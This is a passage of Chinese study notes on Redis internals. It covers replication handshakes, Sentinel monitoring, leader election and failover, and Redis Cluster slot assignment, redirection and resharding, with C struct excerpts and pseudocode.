检查主服务器是否正常处理命令请求 从服务器PING后会遇到下面三种情况之一： 如果主向从返回了一个命令回复，而从不能却不能在规定时间内读出内容（即超时），那么表示当前网络状况不佳，不能继续后续工作。每当出现这种情况，从会断开连接并重新连接主的套接字 如果主返回一个错误，那么表示主服务器暂时没法处理从服务器的命令请求，不能继续执行后续步骤。这是从会断开连接，并重新创建连向主的套接字 如果从读取到了”PONG”回复，那么表示当前状态正常 4. 身份验证 从收到”PONG” 后，就需要进行下一步，即身份验证 如果从服务器设置了 masterauth选项，就需要进行身份验证，反之，就不需要 那么在需要进行身份验证的情况下，从服务器会向主发送一条AUTH命令，其参数为 masterauth 选项的值 在进行身份验证时，可能遇到下面几个情况： 如果主没有设置 requirepass 选项，并且从也没有设置 masterauth，那么主将继续执行从服务器发送的命令，即复制工作继续执行 如果从通过AUTH命令发送的密码和主 requirepass 选项所设置的密码相同，那么主将继续执行从发送的命令；反之就返回一个 invalid password 错误 如果主设置了 requirepass 选项，但从没有设置 masterauth。那么主服务器会返回一个 NOAUTH 错误。 如果主没设置requirepass选项，而从设置了 AUTH，那么主服务器就会返回一个 no password is set错误 所有错误情况都会让从服务器中止目前的复制工作，并创立套接字，重新执行，直到验证通过 5. 发送端口信息 在身份验证之后，从会执行 REPLCONF listening-port &lt;port-number&gt;，向主服务器发送从监听的端口 主服务器接收到之后，就将其记录在对应客户端状态中： typedef struct redisClient{ // ... // 从服务器监听的端口号 int slave_listening_port; // ... }redisClient; slave_listening_port 唯一的作用，是主服务器在执行 INFO replication 命令时，打印出从服务器监听的端口 6. 同步 上面的都执行完后，从服务器将发送 PSYNC 命令，这是主为从的客户端 7. 命令传播 心跳检测在命令传播的阶段，从默认会以每秒一次的频率，向主发送命令： REPLCONF ACK &lt;replication_offset&gt; 其中的replication_offset 就是从服务器当前的偏移量 发送这个命令，主要是检测主从服务器的网络连接状态、辅助实现 min-slaves选项和检测命令丢失 检测主从服务器的网络连接状态 主从服务器通过发送和接收 REPLCONF ACK 命令来检查两者之间的网络连接是否正常 如果超过1s没收到了从服务器发来的 REPLCONF ACK 命令，那么主服务器就认为主从之间的连接失效 通过向主服务器发送INFO replication 命令，在列出的从服务器列表的lag一栏中，我们能看到距离上一次发送过了多少秒，因此值一般为0或者1 辅助实现 min-slaves 配置选项 Redis 的 min-slaves-to-write 和 min-slaves-max-lag 两个选项可以防止主服务器在不安全的情况下执行写命令 如： min-slaves-to-write 3 min-slaves-max-lag 10 那么在从服务器少于三个，或者三个从服务器的延迟（lag）的值都大于或等于10s时，主服务器就会拒绝执行写命令 检测命令丢失 因为 REPLCONF ACK 命令会传递偏移值，所有命令丢失就会很快发现，进而主服务器在重新进行命令传递即可 SentinelSentinel（哨岗、哨兵）是Redis高可用性（high availability）解决方案： 由一个或多个 Sentinel 实例（instance）组成的 Sentinel系统（system），可以监视多个主服务器，和它们属下的所有从服务器，并在主下线时，然后将一个从配置为主。 具体步骤：假设当前server1为主服务器，并且下线时长超过了限制 首先，Sentinel系统会挑选server1属下的其中一个从服务器，将其升级为主服务器 然后，Sentinel 系统会向server1属下的所有从服务器发送新的复制命令，让它们成为新的主服务器的从，当所有从都完成了复制时，故障转移操作即执行完毕 另外，当server1重新上线时，它将会被设置为新当选的从服务器 启动并初始化Sentinel 如何启动一个Sentinel？ redis-sentinel sentinel.conf 或者 redis-server sentinel.conf --sentinel 一个Sentinel启动时，大致需要执行哪些步骤？ 初始化服务器 将Redis服务器使用的代码替换为 Sentinel 专用的代码 初始化 Sentinel 状态 根据给定的配置文件，初始化Sentinel 监视的主服务器列表 创建与主之间的网络连接 初始化服务器 Sentinel本质上也是一个特殊的Redis服务器，所有很多部分都跟Redis服务器初始化相同。 比如：Sentinel不需要数据库，因此就不需要加载RDB或者AOF，也不需要 BGSAVE或SAVE等命令；或者都需要时间事件处理器，只是sentinel的serverCron会执行 sentinel.c/sentinelTimer 函数 使用Sentinel专用代码 将一部份普通Redis服务器使用的代码替换为 Sentinel 专用代码 如：将redis.h/REDIS_SERVERPORT 常量替换为 sentinel.c/REDIS_SENTINEL_PORT #define REDIS_SERVERPORT 6379 #define REDIS_SENTINEL_PORT 26379 并且，在加载命令方面，Sentinel模式下使用 sentinel.c/sentinelInfoCommand函数，因此根本没载入SET、DEL等命令，只有 PING、SENTINEL、INFO、SUBSCRIBE、UNSUBSCRIBE、PSUBSCRIBE、PUNSUBSCRIBE七个命令 初始化 Sentinel 状态 应用专用代码后，跟 redisServer结构体一样，sentinel也有一个结构体用来保存状态 struct sentinelState{ // 当前纪元，用于故障转移 uint64_t current_epoch; // 保存所有被监视的服务器 // 字典键为主服务器的名 // 值为指向 sentinelRedisInstance 结构的指针 dict *master; // 是否进入 TILT 模式 int tilt; // 当前正在执行的脚本数 int running_scripts; // 进入 TILT 模式的时间 mstime_t tilt_start_time; // 最后一次执行时间处理器的时间 mstime_t previous_time; // 一个FIFO队列，包含所有需要执行的脚本 list *scripts_queuq; }sentinel; 初始化 Sentinel 状态的 masters 属性 Sentinel状态的 master 字典记录了所有被 Sentinel 监视的主服务器的相关属性 其字典保存的值就为实例结构，即 sentinelRedisInstance typedef struct sentinelRedisInstance{ // 记录实例的类型，以及当前实例的状态 int flags; // 实例名字 // 主服务器的名字由用户在配置文件进行配置 // 从以及Sentinel的名字由Sentinel自动配置 // 格式为 ip:port, 如\"127.0.0.1:12345\" char *name; // 实例的运行ID char *runid; // 配置纪元，用于实现故障转移 uint64_t config_epoch; // 实例的地址 sentinelAddr *addr; // SENTINEL down-after-milliseconds 选择设置的值 // 实例无响应多少ms后被判断为主观下线（subjectively down） mstime_t down_after_period; // SENTINEL monitor &lt;master-name&gt; &lt;IP&gt; &lt;port&gt; &lt;quorum&gt; 选项中的 quorum 参数 // 判断这个实例为客户下线（objectively down）所需要支持的投票数 int quorum; // SENTINEL parallel-syncs &lt;master-name&gt; &lt;number&gt; 选项的值 // 在执行故障操作时，可以同时对新的主服务器进行同步的从服务器数量 int parallel_syncs; // SENTINEL failover-timeout &lt;master-name&gt; &lt;ms&gt; // 刷新故障转移状态的最大时间 mstime_t failover_timeout; // ... }sentinelRedisInstance; typedef struct sentinelAddr{ char *ip; int port; }sentinelAddr; 初始连接向主服务器的网络连接 最后一步就是创建连向被监视的主机服务器的网络连接，Sentinel 在此时做客户端的职责，可以向主服务器发送命令 对于被监视的主服务器，Sentinel 会创建两个连向主服务器的异步网络： 命令连接：专门用于向主服务器发送命令，并接收命令回复 订阅连接：专门用于订阅主服务器的 __sentinel__:hello频道 为什么是两个连接？ 因为Redis的发布和订阅中，被发送的消息都不会存在Redis服务器中。如果在信息发送时因为接收端断线，导致信息丢失，因此为了不丢失信息，所以需要一个专门的连接，来接收__sentinel__:hello频道的信息 处理订阅频道之外，还有命令的传递，所以还必须向主服务器创建命令连接 因为Sentinel会与多个实例相连，所以这里使用异步连接 获取主服务器信息Sentinel 会默认每10s一次，通过命令连接向被监视的主服务器发送INFO命令，并通过分析回复来获取但主服务器当前的信息 通过分析INFO命令的回复，Sentinel 可以获取下面两个方面的信息： 关于主服务器本身的信息：包括run_id 域记录的服务器运行ID，role域记录的服务器角色 关于主服务器下所有从服务器的信息：每个从都由一个”salve”字符串开头的行记录，包括ip、port等。因此根据这些IP和端口号，Sentinel 就无须用户提供从服务器的地址信息 又因为得到了主服务器的run_id 和 role等信息，Sentinel 将对主服务器的实例结构进行更新。如主服务器重重启之后，它的ID会与之间的保存不同，这时候就需要进行更新 对于返回的从服务器状态，则会用于更新主服务器实例结构的 slaves 字典，这个字典记录了主服务器属下的从服务器名单： 键：Sentinel 自动设置的名字，格式为IP:port 值：从服务器对对应的实例结构，即 sentinelRedisInstance 获取从服务器信息当 Sentinel 发现主有新的从服务器时，Sentinel 除了会为它创建新的实例之外，还会创建连接到从服务器的命令连接和订阅连接 Sentinel 默认情况下，向从发送 INFO 命令，获得以下内容的回复： # Server ... run_id: ... ... # Replication role:slave master_host:127.0.0.1 master_port:6379 master_link_status:up slave_repl_offset:11887 slave_priority:100 # Other sections ... 根据INFO，Sentinel 会提取出下面信息： 从服务器的运行ID： run_id 从服务器的角色：role 主服务器的IP地址 master_host，主服务器的端口号 master_port 主从服务器的连接状态 master_link_status 从服务器的优先级 slave_priority 从服务器的复制偏移量 slave_repl_offset 向主从服务器发送信息默认情况下，Sentinel 会以2s一次的频率，通过命令连接向所有被监视的主服务器和从发送下面格式的命令： PUBLISH __sentinel__:hello \"&lt;s_ip&gt;,&lt;s_port&gt;,&lt;s_runid&gt;,&lt;s_epoch&gt;,&lt;m_name&gt;,&lt;m_ip&gt;,&lt;m_port&gt;,&lt;m_epoch&gt;\" 其中,s_开头的为 Sentinel的信息，而m_开头的参数记录的为主机服务器的信息，如果监视的为主，那就是主的信息，如果是从，那就是从所属主的信息 接收来自主从服务器的频道信息当Sentinel与一个主或从连接起连接订阅连接后，Sentinel 就会通过订阅连接，也订阅频道 SUBSCRIBE __sentinel__:hello 这个订阅会一直持续到Sentinel与服务器的连接断开为止 也就是说，Sentinel 既通过这个频道发布信息，也接受信息。 那么，对于监视同一个服务器的多个Sentinel而言，一个Sentinel 发送的信息也就会被其他 Sentinel 接收到，这些信息会被用于更新其它Sentinel 的认知 当 Sentinel 从 __sentinel__:hello频道收到一条信息时，会对这条信息进行分析，提取出其 Sentinel 的IP、端口号、运行ID等八个参数 如果信息中的运行ID和本机的一样，那么就是自己发送的，直接丢弃 如果不同，就证明是其它其它Sentinel发送来的，更新对应主服务器的实例结构 更新 sentinels 字典 Sentinel 为主服务器创建的实例结构中的 sentinels 字典保存了除了 Sentinel 本身之外，还有监视这个服务器的其它 Sentinel 的资料： 键：Sentinel的名字，格式为 ip:port 值：对应的 Sentinel 实例结构 Sentinel会从其它Sentinel收到的信息分析并提取出下面两方面的参数： 与Sentinel 有关的参数：源 Sentinel 的ip、端口、运行ID和配置纪元 与主服务有关的参数：源 Sentinel 正在监视的主服务器的名字、Ip、端口号和配置纪元 根据提取到的参数，Sentinel 就会再自己的 masters字典中查询相应的实例结构，然后再根据查询到的主服务器实例查询相应的 sentinels 字典，判断源 Sentinel 实例是否存在。 如果没存在，就创建，再更新字典，如果存在就更新 为什么对应的主机实例，还需要创建 sentinels 字段？ 用于让一个 Sentinel 知道其它 Sentinel的存在，而且不需要用户提供其它 Sentinel 的地址信息，可以自动发现 创建连向其它 Sentinel 的命令连接 当一个 Sentinel 发现其它新的 Sentinel 时，不止会在相应的主机实例中更新字典，还会创建一个连向新 Sentinel 的命令连接 注意：这里只用与其它 Sentinel 创建命令连接就行了，不需要订阅连接，因为之前的订阅是接收主从发来的频道信息发现未知的新 Sentinel，而这里就不需要了 检测主观下线状态默认情况下，Sentinel 会以1s一次的频率向所有与它创建了命令连接的实例（包括主从、其它 Sentinel）发送PING，并通过返回的命令，判断是否在线 对应PING命令的回复可以分为下面两种情况： 有效回复：实例返回 +PONG、-LOADING、-MASTERDOWN 三种中的某一个 无效回复：返回有效回复之外的回复，或者超时 Sentinel 配置文件中的 down-after-milliseconds 选项指定了判断主观下线的时间，也就是如果一个实例如果返回了无效返回，那么 Sentinel 会修改其对应的实例结构，即在其 flags 属性中打开 SRI_S_DOWN 标识，表示其已经主观下线 注意：多个 Sentinel 设置的主观下线时长可能不同 检测客观下线状态当一个主服务器判断为主观下线后，为了确认这个主服务器是否是真的下线，它会对同样监视它的其它 Sentinel 进行询问，看它们是否为下线状态（即客观下线或主观下线），收到足够数量的已下线判断后，就将其认为客观下线状态，并进行故障转移 发送 SENTINEL is-master-down-by-addr 命令 Sentinel 使用 SENTINEL is-master-down-by-addr &lt;ip&gt; &lt;port&gt; &lt;current_epoch&gt; &lt;runid&gt;命令询问其它 Sentinel 是否同意主服务器已下线。 ip、port、current 都为主服务器的属性；runid可以为 * 或者 Sentinel 的运行id（*代表检查客观下线，Sentinel的运行id用来选举头领 Sentinel） 接收 SENTINEL is-master-down-by-addr 命令 当一个Sentinel 收到 SENTINEL 命令时，会分析其中包含的各个参数，根据其中的IP和端口，检查主是否已经下线，然后返回一条包含三个参数的 Multi Bulk 回复： 1) &lt;down_state&gt; 2) &lt;leader_runid&gt; 3) &lt;leader_epoch&gt; down_state：返回主服务器的检查结果，1为已下线，0为未下线 leader_runid：可以是*符号或者为 Sentinel 的局部领头的runid leader_epoch：Sentinel 的局部领头 Sentinel 的配置纪元，用于选举领头，只有在 leader_runid 不为*是有用，否则就为0 如： 1) 1 2) * 3) 0 则表明同意下线 接收 SENTINEL is-master-down-by-addr 命令的回复 当同一下线的 Sentinel 超过配置的 quorum 参数的值后，就会被认定为客观下线，将主服务器的 flags 属性的 SRI_O_DOWN 标识打开。 注意：不同Sentinel 判断某个 主服务器为客观下线的条件是不同 选举领头 Sentinel当主服务器被判断为客观下线时，监视这个下线主服务器的各个 Sentinel会进行协商，选举一个头领，并由领头的进行故障转移 如何选举？ 所有 Sentinel 都有被选举为临头的资格 每次临头选举之后，不论选举成功与否，所有 Sentinel 的配置纪元（configuration epoch）的值都会自增一次（配置纪元就是一个计数器） 一个配置纪元里面，所有 Sentinel 都有将某个 Sentinel 设置为局部领头的机会，而且一旦设置，在这个配置纪元里面就无法进行更改 每个发现主服务器进入客观下线的 Sentinel 都会请求其它的 Sentinel 将自己设置为局部领头 Sentinel 当Sentinel 发送的为 SENTINEL is-master-down-by-addr命令时，并且runid不为*,为自己的runid，就表明要求自己成为局部的领头 Sentinel 目标Sentinel回复收到的 SENTINEL命令，回复中leader_runid和leader_epoch 参数分别记录了目标 Sentinel 的局部领头的运行ID和配置纪元（如果当前还未配置局部领头，那么先来就会成为） 源 Sentinel 收到目标 Sentinel 对于 SENTINEL 的回复后，首先判断回复的 leader_epoch 参数是否跟自己的配置纪元，如果相同，就会进行判断 leader_runid 参数是否跟自己的运行id，如果相同，则表示目标已经认位源为局部领头 如果超过半数的 Sentinel 认为这个为局部领头，那么这个Sentinel就成为领头 如果该配置纪元在给定时间内未选出领头，那么各个 Sentinel 将在隔一段时间后，再次进行选举，直到选出 Sentinel 为止 故障转移在选举出领头 Sentinel 后，其领头将会对已下线的主服务器执行故障转移操作 在已下线的主服务器中选择一个从服务器，并将其转化为主服务器 让已下线主服务器属下的所有从服务器都改为复制新的主服务器 将已下线的主服务器设置为新的主的从，即，当以前的主服务器重连后，它会成为新的从服务器 选出新的主服务器 选择一个状态良好、数据完整的从服务器，然后向这个从服务器发送 SLAVEOF no one 命令，将其转化为主服务 这个新的主服务器是怎么选出来的？ 将已下线的主服务器的所有从服务器保存到一个列表中 删除已下线或者断线状态的从服务器，保证列表中剩余的从服务器都是正常在线的 删除列表中所有最近5s内没有回复过领头 Sentinel 的INFO命令的从服务器，保证剩余的都是最近成功进行通信过的 删除所有与已下线主服务器连接断开超过 down-after-milliseconds*10 ms的，保证数据较新 根据优先级、偏移量排序，选择最大的，如果都一样，则根据ID排序，选择最小的ID 然后，Sentinel 会向被选中的从服务器发送 SLAVEOF no one 命令，并且每1s都会向被升级的从服务器发送 INFO 命令（平时为每10s一次），当被升级的 role 从原来的 slave 变成 master 时，领头的就知道已经完成了升级 修改从服务器的复制目标 下一步就是剩下的从服务器去复制新的主服务器，即SLAVEOF命令 将旧的主服务器变为从服务器 因为旧的主已经下线，所以设置保存在了 server1 对应的实例结构里，当server1重新上线时，Sentinel 就会通过命令连接向它发送SLAVEOF命令 集群redis集群是redis提供的分布式数据库方案，集群通过分片（sharding）来进行数据共享，并提供故障转移功能 节点CLUSTER MEET &lt;ip&gt; &lt;port&gt; 命令用来连接各个节点，该node节点会与IP:port所指定的节点进行握手（handshake），当握手成功时，node节点就会将ip和port指定的节点加入当前node所在的集群中 另外，CLUSTER NODES能查看当前集群里的所有节点 启动节点 Redis 服务器在启动时会根据 cluster-enabled 配置选项是否为yes来决定是否开启服务器的集群模式，反之就为单机（stand alone）模式 节点也会继续使用所有在单机模式中的服务器组件，如： 文件时间来处理命令请求和回复 时间事件处理器来执行 serverCron 函数，而serverCron函数也会调用集群特有的 clusterCron函数 数据库来保存键值对 RBD和AOF 另外，也会使用redisServer和redisClient。对于只有集群模式下才会用到的数据，节点将其保存到了 cluster.h/clusterNode 、clusterLink、clusterState结构里面 集群的数据结构 每个节点都会使用一个 clusterNode 来保存自己的状态，为集群中的其它节点（包括主从节点）都创建一个 clusterNode 结构，以此来记录其它节点的状态： struct clusterNode{ // 创建时间 mstime_t ctime; // 节点的名字，由40个十六进制字符组成 char name[REDIS_CLUSTER_NAMELEN]; // 节点标识 // 记录当前节点的角色（主从） // 以及当前所处的状态（是否下线） int flags; // 节点当前的配置纪元，用于实现故障转移 uint64_t configEpoch; // 节点的IP char ip[REDIS_IP_STR_LEN]; // 节点的端口号 int port; // 保存连接节点所需的有关信息 clusterLink *link; //... }; link属性为一个 clusterLink 结构，该结构保存了连接节点的有关信息： typedef struct clusterLink{ // 连接创建的时间 mstime_t ctime; // TCP 套接字描述符 int fd; // 输出缓冲区 sds sndbuf; // 输入缓冲区 sds rcvbuf; // 与这个连接相关联的节点，如果没有就为NULL struct clusterNode *node; }clusterLink; redisClient 和 clusterLink 的异同？ 同：都有自己的输入输出缓冲区和套接字描述符 异：redisClient 中的缓冲区和套接字是用于与客户端之间的连接，而clusterLink为用于节点之间的连接 最后，每个节点都保存着一个 clusterState结构，这个结构记录了在当前节点的视角下，集群目前所处的状态 typedef struct clusterState{ // 指向当前节点的指针 clusterNode *myself; // 集群当前的配置纪元 uint64_t currentEpoch; // 集群当前的状态 int state; // 集群中至少处理着一个槽的节点的数量 int size; // 集群节点的名单（包括myself） // 键位节点名字，值位 clusterNode 结构 dict *node; // ... }clusterState; CLUSTER MEET 命令的实现 假设节点A像B发送CLUSTER MEET 命令，那么节点之间会进行握手（handshake），来确认彼此的存在，并为后续的通信打好基础： 节点A会为B创建一个 clusterNode 结构，并将该结构添加到自己的 clusterState.nodes 字典里 节点A根据 CLUSTER MEET 给定的IP和端口号，向B发送一条MEET消息（message） 节点B收到A发送的MEET消息，节点B会为A创建一个 clusterNode 结构，然后将其加入到自己的 clusterState.nodes 字典里 节点B向A返回一条PONG消息 A节点通过这条PONG信息，确认B已经收到A的发送的MEET信息 然后，A又会向B发送一条PING消息 B收到A发送的PING，确认A已经收到自己的PONG，握手完成 最后，A会将B的信息通过 Gossip 协议传播给集群中的其它节点，让其它节点与B握手，最终，一段时候后，节点B就会被集群中的所有节点认识 槽指派Redis 集群通过分片的方式来保存数据库中的键值对：集群的整个数据库被分为16384个槽（slot），而数据库的每个键都属于这 16384 槽中的一个，集群中的每个节点可以处理0个或最多16384个槽 只有当数据库中的16384个槽都有节点在处理时，集群才处于上线状态（ok），反之，则为下线状态（fail） 通过向节点发送CLUSTER ADDSLOTS命令，可以将一个或多个槽指派（assign）给节点负责，如： # CLUSTER ADDSLOTS &lt;slot&gt; [slot ...] redis&gt; CLUSTER ADDSLOTS 0 1 2 3 4 ... 5000 记录节点的槽指派信息 clusterNode 结构的 slots 属性和 numslot 属性记录了节点负责处理哪些槽： struct clusterNode{ // ... unsigned char slots[16384/8]; int numslots; // ... }; slots 属性为一个二进制数组（bit array），这个数组的长度为 2048 个字节，共 16384 个二进制位 如果对应的 slots 位上的值为1，那边就代表负责处理槽i；反之为0，就不处理。 那么，对于一个给定节点的 slots数组来说，检查是否负责处理某个槽或者指派某个槽给节点的时间复杂度为O(1) 传播节点的槽指派信息 一个节点不仅会记录自己的槽信息，还会将自己的slots数组通过消息发送给集群中的其它节点，以此来告知其它节点自己负责了哪些槽 并且每个节点收到之后，还会在自己的 clusterState.nodes 找到相应的 clusterNode结构，并对结构中的 slots 数组进行保存或更新，这样每个节点都会知道整个集群分配的槽了 记录集群所有槽的指派信息 clusterState 结构中的 slots 数组记录了集群中所有 16384 个槽的指派信息： typedef struct clusterState{ // .. clusterNode *slots[16384]; // ... }; slots 数组包含 16384 个项，每项都指向一个 clusterNode 结构的指针： 如果 slots[i] 指针指向 NULL，那么就表示槽 i 尚未指派给任何节点 反之就指向对应的节点 为什么需要 clusterNode.slots 数组 和 clusterState.slots 数组？ 如果节点只使用 clusterNode.slots 数组来记录槽的指派信息，那么当需要知道i是否被指派，或者i被谁指派时，就需要遍历 clusterState.nodes字典中的所有 clusterNode结构，并检查这些结构的 slots数组，时间复杂度为 O(n)；而对于 clusterState.slots 数组，只需要 O(1)的时间复杂度即可 当程序需要将某个节点的槽指派信息通过消息发送给其它信息时，程序只需要将相应节点的 clusterNode.slots 数组整个发送过去即可 CLUSTER ADDSLOTS 命令的实现 伪代码实现： def CLUSTER_ADDSLOTS(*all_input_slots): # 遍历所有输入槽，检查是否未指派 for i in all_input_slots: # 如果有一个已经指派了，就返回错误，并终止命令 if clusterState.slots[i]!=NULL: reply_error() return # 都是未指派的 for i in all_input_slots: clusterState.slots[i]=clusterState.myself setSlotBit(clusterState.myself.slots,i) 在集群中执行命令在数据库的 16384个槽都进行了指派后，集群就会进行上线状态，这时候客户端就可以向集群中的节点发送数据命令了 当客户端向节点发送与数据库键有关的命令时，接收命令的节点会计算出命令要处理的数据库键属于哪个槽，如果这个槽正好就指派给了当前节点，那么节点直接执行这个命令；如果没有指派给当前节点，那么就会返回一个 MOVED 错误，指引客户端转向（redirect）至正确的节点，并再次发送之前想要执行的命令 计算键属于哪个槽 伪代码实现： def slot_number(key): return CYC16(key) &amp; 16383 使用 CYC16计算key的 CYC-16 校验和 对于命令CLUSTER KEYSLOT &lt;key&gt;，可以查看给定键属于哪个槽： redis&gt; CLUSTER KEYSLOT \"date\" (integer) 2022 判断槽是否由当前节点负责处理 在计算出键所属的槽i后，节点检查自己的 clusterState.slots 数组中的i项，判断其是否由自己负责 如果是，就自己处理，反之就根据指针指向的 clusterNode结构所记录的IP和端口，向客户端返回 MOVED 错误 MOVED 错误 当节点发现该键并非自己处理时，就会向客户端返回一个 MOVED 错误，指引客户端转向至正在负责槽的节点。 MOVED 错误格式为：MOVED &lt;slot&gt; &lt;ip&gt;:&lt;port&gt; 如：MOVED 10086 127.0.0.1:7002 每次切换客户端不会造成开销？ 一个集群客户端通常会与集群中的多个节点创建套接字连接，所以实际上切换客户端，只是换一个套接字来发送命令。如果尚未连接，创建连接即可 注意：集群模式下的 redis-cli 客户端在接收 MOVED 错误时，会自动切换，再打印出日志。只有在单机模式下，会将MOVED 错误打印出来，因为它不知道MOVED错误是什么 节点数据库的实现 节点对过期键的保存跟单机一样 节点和单机在数据库方面的一个区别是，节点只能用0号数据库 另外，除了将键值对保存在数据库里面之外，节点还会用 clusterState结构中的 slots_to_keys 跳跃表来保存槽和键之间的关系： typedef struct clusterState{ // ... zskiplist *slots_to_keys; // ... }clusterState; slots_to_keys 跳跃表每个节点的分值（score）都是一个编号，每个节点的成员都是一个数据库键 那么，通过 slots_to_keys 跳跃表中记录的各个数据库键所属槽，就能方便对某个或某些槽的所有数据库键进行操作，如：CLUSTER GETKEYSINSLOT &lt;slot&gt; &lt;count&gt;返回最多count个属于槽slot的数据库键 重新分片重新分片：将任意数量个已经分派给某个节点的槽，分配给另一个节点，并且相关槽所属的键值对也会被移动到另一个节点 重新分片可为在线进行，并且在重新分配过程中，集群不用下线，对应的节点也可以继续处理命令请求 重新分片的实现原理 由 Redis 的集群管理软件 redis-trib 负责执行，它通过向源节点和目标节点发送命令来重新分片操作 对集群的单个槽 slot 进行重新分片的操作如下： 对目标节点发送 CLUSTER SETSLOT &lt;slot&gt; IMPORTING &lt;source_id&gt; 命令，让目标节点准备好从源节点导入（import）属于槽 slot 的键值对 对源节点发送 CLUSTER SETSLOT &lt;slot&gt; MIGRATING &lt;target_id&gt;命令，让源节点准备好将属于槽 slot 的键值对迁移（migrate）至目标节点 向源节点发送CLUSTER GETKEYSINSLOT &lt;slot&gt; &lt;count&gt;命令，获取最多 count个属于槽 slot 的键值对的键名 将步骤3获取的所有键名，遍历，并将每一个都向源节点发送一个MIGRATE &lt;target_ip&gt; &lt;target_port&gt; &lt;key_name&gt; 0 &lt;timeout&gt;命令，即将被选中的键原子地从源迁移至目标 重复34步骤，直到所有键都被迁移 redis-trib 向集群中的任意一个节点发送 CLUSTER SETSLOT &lt;slot&gt; NODE &lt;targer_id&gt;命令，即将槽 slot 指派给了目标节点，然后再发送给整个集群 ASK 错误在进行重新分片的过程中，可能存在一部分键值对在源节点里面，而另一部分键值对则保存在目标节点里。 那么，当这时用户查找某个键时，如果正在迁移过程中，且正好迁移到了目标节点，就会返回一个 ASK 错误，指引客户端转向正在导入的槽，并再次发送之前想要执行的命令 注意：在群集下的 redis-cli 接到 ASK 错误时，也会跟 MOVED 一样，进行转向，也不会打印出错误 CLUSTER SETSLOT IMPORTING 命令的实现 clusterState 结构的 importing_slots_from 数组记录了当前节点正从其它节点导入的槽： typedef struct clusterState{ // ... clusterNode *importing_slots_from[16384]; // ... }clusterState; 在对集群重新进行分片时，会向目标节点发送：CLUSTER SETSLOT &lt;i&gt; IMPORTING &lt;source_id&gt; 如： CLUSTER SETSLOT 16198 IMPORTING 9df3... CLUSTER SETSLOT MIGRATING 命令的实现 clusterState 结构的 migrating_slots_to 数组记录了当前节点正在迁移其它节点的槽： typedef struct clusterState{ // ... clusterNode *migrating_slots_to[16384]; // ... }clusterState; 在集群重新分片时，向源节点发送：ClUSTER SETLOT &lt;i&gt; MIGRATING &lt;target_id&gt; ASK 错误 当节点未查找自己数据库中的键时，会查看 clusterState.migrating_slots_to[i] ，其i是否正在进行迁移，如果时，就会返回一个对应的ASK错误 接收到ASK错误的客户端，会向目标节点发送一个ASKING 命令，之后再执行原本想执行的命令 ASKING 命令 ASKING 命令唯一要做的就是打开客户端的 REDIS_ASKING 标识 伪代码实现： def ASKING(): # 打开标识 client.flags |= REDIS_ASKING # 向客户端返回 OK reply(\"OK\") 因为，若该节点判断没有改键时，会执行 MOVED 错误， 然而，如果带有 ASKING 标识，节点就会继续执行客户端发送的命令 注意：REDIS_ASKING 标识只能用一次，用一次之后便会被移除 复制和故障转移集群中的节点也分为主节点和从节点，主节点用于处理槽，而从节点用于复制某个主节点，并在被复制的主节点下线时，代替下线的主节点继续处理命令 设置从节点 向一个节点发送 CLUSTER REPLICATE &lt;node_id&gt; 让接收的从节点进行对主节点的复制： 接收到该命令的节点首先会在自己的 clusterState.nodes 字典中找到 node_id 对应的 clusterNode 结构，并将自己的 clusterState.myself.slaveof 指针指向这个结构，以此来表示该节点正在进行主节点的复制 struct clusterNode{ // ... struct clusterNode *slaveof; // ... }; 修改自己的 clusterNode.myself.flags 中的标识，关闭原来的 REDIS_NODE_MASTER 标识，打开 REDIS_NODE_SLAVE 标识。表示这个节点已经由主变为了从 节点调用复制代码，根据保存的主节点的IP和port，这里跟单机数据库一样，即相当于向从数据库发送SLAVEOF &lt;master_ip&gt; &lt;master_port&gt; 另外，一个节点成为从节点，并开始复制某一个主节点这一信息会通过消息发送给集群中的其它节点，最终集群中的所有节点都会在知道某个从正在复制某个主节点 集群中的所有节点都会在代表主节点的 clusterNode 结构的 slaves 属性和 numslaves 属性中记录正在复制这个主节点的名单： struct clusterNode{ // ... // 正在复制这个主节点的从节点数量 int numslaves; // 数组，指向复制该主节点的从节点名单 struct clusterNode **slaves; // ... }; 故障检测 集群中的节点会定期向集群中其他节点发送 PING 信息，来检测对方是否在线，如果没有及时回复，就会将其标记为疑似下线（probable fail，PFAIL） 集群中的各个节点之间还会通过互发消息的方式来交换集群中各个节点的状态信息，某个节点是处于在线状态、疑似下线状态（PFAIL）、还是已下线状态（FAIL） 一个节点收到某个节点进入疑似下线状态时，会将节点的下线报告（failure report）添加到 clusterNode 结构的 fail_reports 链表里面： struct clusterNode{ // ... // 一个链表，记录所有其他节点对该节点的下线报告 list *fail_reports; // ... }; 每个下线报告都由 clusterNodeFailReport 结构表示： struct clusterNodeFailReport{ // 已下线的节点 struct clusterNode *node; // 最后一次从 node 节点收到下线报告的时间 // 用来检测这个报告是否过期，过得太久的下线报告会被删除 mstime_t time; }typedef clusterNodeFailReport; 当集群中超过半数以上负责槽的主节点都将某个主节点报告为疑似下线时，这个节点就会被标记为已下线（FAIL），并且将该节点已下线的消息广播给其他节点 故障转移 已下线的主所属的从节点中，选择一个 对被选中的从，执行 SLAVEOF no noe，成为主节点 将已下线的主的槽指派给自己 向集群广播一条 PONG消息，让其他节点知道自己已由从变为了主，并接管了原本主负责的槽 新主节点负责处理与槽有关的命令 选举新的主节点 从节点向集群发送一条广播消息 CLUSTERMSG_TYPE_FAILOVER_AUTH_REQUEST 其他都跟选举主哨兵一样，超过半数、配置纪元等 都是根据 Raft算法进行领头选举的 消息集群中的各个节点都是通过发送和接收消息（message）来进行通信的。由消息头（header）和消息正文（data）组成 发送的消息主要有以下五种： MEET 消息：请求接收者加入到发送者当前所处的集群里 PING 消息：每个节点默认每隔1s就会从已知节点列表中随机选出五个节点，然后对五个节点中最久未发送过 PING 消息的节点发送 PING 消息，以此来检测被选中的节点是否在线。如果节点A最后一次收到节点B返回的PONG消息的时间，超过了当前节点A的 cluster-node-timeout 选项设置时长的一半，那么节点A也会向B发送PING，防止长期未选择到B而导致消息更新滞后 PONG 消息：当接收者收到发送者发来的 MEET 消息 或者 PING消息时，返回一条PONG。也可以向集群广播一条PONG，来刷新关于这个节点的认知。如：故障转移后的PONG，告知集群自己成为主节点 FAIL 消息：某个节点判断该节点已经为下线状态时，就会广播一条关于该节点的FAIL 消息 PUBLISH 消息：节点会执行这个命令，并向集群广播这个命令，让其它节点也执行 消息头 记录消息发送者自身的一些信息，因为这些信息也会被消息接收者使用到 typedef struct{ // 消息的长度，包括了头和正文 uint32_t totlen; // 消息的类型 uint16_t type; // 消息正文包含的节点信息数量 // 只发送 MEET、PING、PONG三种 Gossip 协议消息时使用 uint16_t count; // 发送者的配置纪元 